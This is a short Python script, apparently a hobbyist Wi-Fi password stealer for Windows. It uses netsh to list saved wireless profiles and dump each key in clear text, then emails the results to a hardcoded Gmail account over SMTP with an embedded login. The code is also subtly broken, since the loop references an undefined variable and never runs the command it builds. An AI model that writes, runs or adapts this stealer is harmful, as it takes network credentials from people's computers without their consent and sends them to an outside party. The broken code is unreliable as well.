
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
networks = str(networks)
networks = networks[:-9]
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) # with ?: we omit the first group (Profile)
result = bytearray()

for network_name in network_names_list:
    command = ('netsh wlan show profile ' + network_name + ' key=clear')
    current_result = subprocess.check_output(password_crack_command, shell=True)
    result += current_result


send_mail('hashmicromachine@gmail.com', 'youhavebeenhacked', result)

# command = 'netsh wlan show profile Orange5G-3AC4 key=clear'
# network_names = re.search("(Profile\s*:\s)(.*)", networks) finds the first text that matches the reg exp.
# We are gonna use regex to separate the User Profiles from windows to get the networks IDs